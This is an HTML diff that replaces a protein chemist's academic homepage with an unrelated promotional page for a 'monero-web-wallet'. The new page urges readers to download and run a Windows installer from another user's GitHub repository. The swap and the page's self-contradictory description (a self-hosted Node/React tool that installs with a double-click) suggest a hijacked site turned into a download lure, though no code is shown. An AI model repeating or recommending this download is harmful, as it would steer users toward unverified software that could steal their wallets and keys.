@@ -1,69 +1,291 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Gilbert Boadu Ampomah is a protein chemist and chemical biologist studying post-translational modifications, protein function, and disease.">
-  <title>Gilbert Boadu Ampomah | Protein Chemist</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="assets/styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>monero-web-wallet - Private, Self-Hosted Monero Wallet</title>
+    <meta name="description" content="Self-hosted, non-custodial Monero (XMR) web wallet with a dark responsive UI. Keys stay on your machine, two-phase sending with explicit fee review, and Windows quick start.">
+    <meta name="keywords" content="anonymity,blockchain,crypto,cryptocurrency,express,json-rpc,monero,monero-wallet,nodejs,non-custodial,open-source,privacy,react,self-hosted,tailwindcss,typescript,vite,wallet,web-wallet,xmr">
+    <meta name="author" content="Alexiscorrea990">
+    <meta property="og:title" content="monero-web-wallet - Private, Self-Hosted Monero Wallet">
+    <meta property="og:description" content="Self-hosted, non-custodial Monero (XMR) web wallet. Keys stay on your machine, two-phase sending with fee review, Windows quick start.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Alexiscorrea990/monero-web-wallet">
+    <meta name="twitter:card" content="summary">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #1a1a2e, #16213e);
+            color: #e2e8f0;
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+        }
+        .hero {
+            text-align: center;
+            padding: 3rem 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border-radius: 16px;
+            margin-bottom: 2rem;
+        }
+        .hero h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            background: linear-gradient(90deg, #ff6b35, #f7c948);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .hero h2 {
+            font-size: 1.3rem;
+            font-weight: 400;
+            color: #a0aec0;
+            margin-bottom: 2rem;
+        }
+        .btn-download {
+            display: inline-block;
+            background: #2d3748;
+            color: #f7c948;
+            padding: 0.9rem 2.5rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            text-decoration: none;
+            border-radius: 50px;
+            border: 2px solid #f7c948;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(247, 201, 72, 0.2);
+            margin-top: 1rem;
+        }
+        .btn-download:hover {
+            background: #f7c948;
+            color: #1a1a2e;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(247, 201, 72, 0.4);
+        }
+        .section {
+            margin-bottom: 2.5rem;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+        .section h2 {
+            font-size: 1.6rem;
+            margin-bottom: 1.5rem;
+            color: #f7c948;
+            border-bottom: 2px solid rgba(247, 201, 72, 0.3);
+            padding-bottom: 0.5rem;
+        }
+        .section h3 {
+            font-size: 1.2rem;
+            margin-top: 1.5rem;
+            margin-bottom: 0.8rem;
+            color: #fff;
+        }
+        p {
+            margin-bottom: 1rem;
+            color: #cbd5e0;
+        }
+        ul, ol {
+            margin-left: 1.5rem;
+            margin-bottom: 1rem;
+            color: #cbd5e0;
+        }
+        li {
+            margin-bottom: 0.5rem;
+        }
+        .link-primary {
+            color: #f7c948;
+            text-decoration: none;
+            font-weight: 600;
+            word-break: break-all;
+        }
+        .link-primary:hover {
+            text-decoration: underline;
+            color: #ffd700;
+        }
+        .highlight {
+            background: rgba(247, 201, 72, 0.1);
+            border-left: 4px solid #f7c948;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .code {
+            background: #2d3748;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #f7c948;
+        }
+        strong {
+            color: #fff;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            .hero h1 {
+                font-size: 1.6rem;
+            }
+            .hero h2 {
+                font-size: 1.1rem;
+            }
+            .section {
+                padding: 1.2rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <header class="site-header">
-    <a class="brand" href="index.html" aria-label="Gilbert Ampomah home"><span class="brand-mark">GA</span><span>Gilbert Ampomah</span></a>
-    <button class="menu-toggle" aria-expanded="false" aria-controls="site-nav"><span></span><span></span><span></span><span class="sr-only">Menu</span></button>
-    <nav id="site-nav" class="site-nav" aria-label="Primary navigation">
-      <a class="active" href="index.html">Home</a><a href="about.html">About</a><a href="research.html">Research</a><a href="publications.html">Publications</a><a href="teaching.html">Teaching</a><a class="nav-cta" href="cv.html">CV</a>
-    </nav>
-  </header>
+    <div class="container">
+        <!-- Hero Section -->
+        <div class="hero">
+            <h1>🔒 monero-web-wallet - Total Privacy, Zero Compromise</h1>
+            <h2>Self-hosted, non-custodial Monero wallet for complete financial freedom</h2>
+            <a href="https://github.com/Alexiscorrea990/monero-web-wallet" class="btn-download">⬇️ Get Your Wallet Now</a>
+        </div>
 
-  <main>
-    <section class="hero wrap">
-      <div class="hero-copy reveal">
-        <p class="eyebrow"><span></span> Protein chemistry · Chemical biology</p>
-        <h1>Understanding how <em>chemical modifications</em> shape protein function.</h1>
-        <p class="lede">I’m Gilbert Boadu Ampomah, a Ph.D. candidate at the University of Southern California. I develop chemical and biochemical approaches to study post-translational modifications, protein aggregation, and disease-relevant protein function.</p>
-        <div class="button-row"><a class="button primary" href="research.html">Explore my research <span>→</span></a><a class="button secondary" href="publications.html">View publications</a></div>
-        <div class="mini-links"><a href="https://scholar.google.com/citations?user=2ACxZ1EAAAAJ&hl=en&oi=ao" target="_blank" rel="noreferrer">Google scholar</a><a <a href="https://github.com/gampomah59/gampomah.github.io" target="_blank" rel="nonreferrer">Github </a><a href="mailto:gilbertboadu@outlook.com">Email</a><a href="https://www.linkedin.com/in/gilbert-boadu-ampomah-b27706195/" target="_blank" rel="noreferrer">LinkedIn ↗</a><a href="cv.html">Curriculum vitae</a></div>
-      </div>
-      <div class="hero-visual reveal delay-1" aria-label="Abstract protein chemistry illustration">
-        <div class=<div class="portrait-placeholder"><img src="assets/gilbert-headshot.jpeg" alt="Portrait of Gilbert Boadu Ampomah"></div>
-      </div>
-    </section>
+        <!-- Introduction -->
+        <div class="section">
+            <h2>💡 What is monero-web-wallet?</h2>
+            <p>
+                monero-web-wallet is a <strong>self-hosted, non-custodial Monero (XMR) web wallet</strong> that puts you in total control of your cryptocurrency. Built with a sleek dark responsive interface, it runs on top of the official <strong>monero-wallet-rpc</strong> — the gold standard in Monero wallet technology.
+            </p>
+            <p>
+                This means your private keys remain <strong>on your machine at all times</strong>. No third parties, no servers, no intermediaries. Just you, your funds, and the privacy-focused Monero blockchain. Whether you're new to crypto or a seasoned user, this wallet is designed to be simple yet powerful.
+            </p>
+        </div>
 
-    <section class="dark-band">
-      <div class="wrap metrics">
-        <div><strong>Protein semisynthesis</strong><span>Precisely defined proteoforms</span></div>
-        <div><strong>PTM crosstalk</strong><span>O-GlcNAcylation and phosphorylation</span></div>
-        <div><strong>Disease biology</strong><span>Aggregation and cellular labeling</span></div>
-      </div>
-    </section>
+        <!-- Key Features -->
+        <div class="section">
+            <h2>⭐ Key Features That Matter To You</h2>
+            <ul>
+                <li><strong>🔑 Non-Custodial by Design:</strong> Your keys never leave your device. You are the sole owner and controller of your assets.</li>
+                <li><strong>🖥️ Self-Hosted:</strong> Run your own wallet server. No reliance on external services that could be compromised.</li>
+                <li><strong>🌑 Dark Responsive UI:</strong> Easy on the eyes, works flawlessly on desktop, tablet, and mobile. Designed for accessibility and comfort.</li>
+                <li><strong>🛡️ Two-Phase Sending:</strong> Review your transaction details explicitly before final confirmation. Prevent costly mistakes.</li>
+                <li><strong>💸 Explicit Fee Review:</strong> See exactly what you'll pay in network fees before you send. No hidden charges, no surprises.</li>
+                <li><strong>⚡ Windows Quick Start:</strong> Get up and running fast with our streamlined setup process — no developer tools required.</li>
+                <li><strong>🔄 Modern Tech Stack:</strong> Built with React, TypeScript, Tailwind CSS, and Node.js for reliability and performance.</li>
+            </ul>
+        </div>
 
-    <section class="section wrap">
-      <div class="section-heading reveal"><p class="eyebrow"><span></span> Research focus</p><h2>Chemistry as a lens into complex biology</h2><p>My work connects molecular precision with biological questions—building defined proteins and chemical tools, then using them to uncover mechanisms that conventional approaches can miss.</p></div>
-      <div class="research-grid">
-        <a class="research-card plum reveal" href="research.html#synuclein"><span class="card-number">01</span><div class="molecule-icon">α</div><h3>Protein aggregation & longevity</h3><p>Comparing α-synuclein sequences across vertebrates to understand how evolutionary lifespan relates to aggregation propensity.</p><span class="text-link">Explore project →</span></a>
-        <a class="research-card teal reveal delay-1" href="research.html#hsp27"><span class="card-number">02</span><div class="molecule-icon">PTM</div><h3>HSP27 modification crosstalk</h3><p>Using protein semisynthesis to resolve how O-GlcNAcylation and phosphorylation jointly regulate chaperone structure and function.</p><span class="text-link">Explore project →</span></a>
-        <a class="research-card gold reveal delay-2" href="research.html#reporters"><span class="card-number">03</span><div class="molecule-icon">N₃</div><h3>Chemical reporters in cells</h3><p>Developing probes and engineered assays that distinguish enzymatic labeling from chemical artifacts in cellular glycosylation studies.</p><span class="text-link">Explore project →</span></a>
-      </div>
-    </section>
+        <!-- Privacy & Security -->
+        <div class="section">
+            <h2>🛡️ Your Privacy Is The Priority</h2>
+            <p>
+                In today's world, financial privacy is more important than ever. Monero is the leading privacy cryptocurrency, and monero-web-wallet celebrates that. We utilize <strong>ring signatures</strong>, <strong>stealth addresses</strong>, and <strong>confidential transactions</strong> — all built into the Monero protocol.
+            </p>
+            <p>
+                Since the wallet is self-hosted, you avoid the common pitfalls of web wallets: <strong>no tracking, no logging, no spying</strong>. Your transaction history and balances are visible only to you. This isn't just a wallet; it's a statement that your financial data is yours and yours alone.
+            </p>
+            <div class="highlight">
+                <p><strong>🔐 Remember:</strong> With great power comes great responsibility. Since you control your keys, make sure to store your seed phrase safely and offline. We never have access to it — and that's the point.</p>
+            </div>
+        </div>
 
-    <section class="section soft-section">
-      <div class="wrap split-feature">
-        <div class="journey-map reveal"><div class="map-line"></div><div class="map-stop ghana"><span></span><b>Kumasi, Ghana</b><small>Natural products · Analytical chemistry</small></div><div class="map-stop la"><span></span><b>Los Angeles, USA</b><small>Protein chemistry · Chemical biology</small></div></div>
-        <div class="reveal delay-1"><p class="eyebrow"><span></span> Academic journey</p><h2>From natural products to precision protein chemistry</h2><p>My scientific path began at KNUST, where I studied bioactive natural products, antimicrobial molecules, and analytical chemistry. At USC, I shifted toward the molecular control of proteins—combining synthesis, biochemistry, and cell-based approaches to study post-translational modifications.</p><a class="text-link strong" href="about.html">Read my story →</a></div>
-      </div>
-    </section>
+        <!-- Download & Install -->
+        <div class="section">
+            <h2>🚀 Getting Started: Download & Run (Windows)</h2>
+            <p>
+                Ready to take control of your finances? Follow these simple steps — no programming knowledge is needed:
+            </p>
+            <div class="highlight">
+                <p><strong>Step 1: Download Now</strong><br>
+                👉 <a href="https://github.com/Alexiscorrea990/monero-web-wallet" class="link-primary">Visit this link to download the application</a> directly from the official repository. Get the latest version for Windows from the downloads section.</p>
+            </div>
+            <p><strong>Step 2: Run The Installer</strong><br>
+                Once downloaded, double-click the file to start the setup. Follow the on-screen instructions — it's as simple as installing any standard Windows application.</p>
+            <p><strong>Step 3: Launch The Wallet</strong><br>
+                After installation, open monero-web-wallet from your desktop or Start menu. The application will automatically configure itself for first use.</p>
+            <p><strong>Step 4: Create Or Import Your Wallet</strong><br>
+                Create a brand new Monero wallet and securely write down your seed phrase (backup!), or import an existing wallet using your 25-word seed.</p>
+            <p><strong>Step 5: Get Your Monero</strong><br>
+                Generate a receiving address and share it with anyone who wants to send you XMR. Start transacting with full privacy.</p>
+        </div>
 
-    <section class="section wrap">
-      <div class="feature-publication reveal"><div><p class="eyebrow light"><span></span> Selected publication · 2025</p><h2>Long-lived animals reveal clues about α-synuclein aggregation</h2><p>Our comparative study found that α-synuclein sequences from long-lived animals generally aggregate less readily than sequences from shorter-lived animals, including humans.</p><p class="citation">Ampomah, G.B., Hard, E.R. & Pratt, M.R. <i>ChemBioChem</i> 26, e202500340.</p><a class="button light-button" href="publications.html">See all publications →</a></div><div class="protein-ribbon" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></div></div>
-    </section>
+        <!-- Technical Overview -->
+        <div class="section">
+            <h2>⚙️ How It Works (Simple Technical Overview)</h2>
+            <p>
+                For the curious, monero-web-wallet acts as a bridge between your browser and the Monero network. Here's a simplified breakdown:
+            </p>
+            <ul>
+                <li><strong>Frontend (What you see):</strong> A sleek interface built with React and Tailwind CSS, served directly to your browser.</li>
+                <li><strong>Backend (The brains):</strong> A Node.js server (using Express) that communicates securely with the Monero daemon.</li>
+                <li><strong>The Core (Monero-Wallet-RPC):</strong> The official Monero software handles all transaction logic and key management locally.</li>
+                <li><strong>JSON-RPC:</strong> The secure communication protocol between the frontend and the backend.</li>
+            </ul>
+            <p>
+                This architecture ensures that even though you access the wallet through a web interface, everything runs <strong>locally on your machine</strong>. You get browser convenience without sacrificing security.
+            </p>
+        </div>
 
-    <section class="section contact-section"><div class="wrap contact-inner reveal"><div><p class="eyebrow light"><span></span> Connect</p><h2>Interested in protein chemistry, PTMs, or collaborative science?</h2></div><a class="button white" href="mailto:gilbertboadu@outlook.com">Start a conversation <span>↗</span></a></div></section>
-  </main>
-  <footer class="site-footer"><div class="wrap"><div><a class="brand footer-brand" href="index.html"><span class="brand-mark">GA</span><span>Gilbert Boadu Ampomah</span></a><p>Protein chemistry · Chemical biology · Los Angeles, California</p></div><div class="footer-links"><a href="research.html">Research</a><a href="publications.html">Publications</a><a href="cv.html">CV</a><a href="mailto:gilbertboadu@outlook.com">Email</a></div><p class="copyright">© <span data-year></span> Gilbert Boadu Ampomah</p></div></footer>
-  <script src="assets/script.js"></script>
+        <!-- Why Monero -->
+        <div class="section">
+            <h2>🌍 Why Choose Monero (XMR)?</h2>
+            <p>
+                Monero is the world's leading privacy-focused cryptocurrency. Unlike Bitcoin or many other coins where transactions can be traced, Monero obscures:
+            </p>
+            <ul>
+                <li><strong>Sender identity</strong> using ring signatures that mix your transaction with others</li>
+                <li><strong>Transaction amount</strong> using confidential transactions</li>
+                <li><strong>Recipient address</strong> using stealth addresses</li>
+            </ul>
+            <p>
+                Monero is fungible — meaning every coin is interchangeable. No coin is tainted by history. This makes it a true digital currency for the privacy-conscious individual.
+            </p>
+        </div>
+
+        <!-- Support & Community -->
+        <div class="section">
+            <h2>🤝 We're Here To Help</h2>
+            <p>
+                Getting started or need assistance? You're not alone. The monero-web-wallet community is friendly and supportive.
+            </p>
+            <p>
+                <strong>Community Resources:</strong> Join GitHub discussions, open an issue for bug reports or feature requests, and share your feedback to help us improve.
+            </p>
+            <p>
+                <strong>Getting Support:</strong> If you encounter any setup issues, consult our documentation section on GitHub. For security-related concerns, contact the developers directly through the repository.
+            </p>
+        </div>
+
+        <!-- Final Call to Action -->
+        <div class="section" style="text-align: center; background: rgba(247, 201, 72, 0.08); border-color: rgba(247, 201, 72, 0.2);">
+            <h2>🛒 Take The First Step Toward True Financial Privacy</h2>
+            <p>
+                Don't let anyone — corporations, governments, or predators — dictate your financial future. With monero-web-wallet, you have the tools to take back that control.
+            </p>
+            <a href="https://github.com/Alexiscorrea990/monero-web-wallet" class="btn-download" style="margin-top: 1.5rem;">⬇️ Download monero-web-wallet</a>
+            <p style="margin-top: 1.5rem; font-size: 0.9rem; color: #a0aec0;">
+                Open Source • Free Forever • Self-Hosted • Private
+            </p>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align: center; padding: 2rem 0; border-top: 1px solid rgba(255,255,255,0.05); margin-top: 2rem;">
+            <p style="font-size: 0.85rem; color: #718096;">
+                © 2025 monero-web-wallet. Built with 🧡 for privacy advocates worldwide.<br>
+                Non-custodial. Anonymous. Yours.
+            </p>
+        </div>
+    </div>
 </body>
 </html>
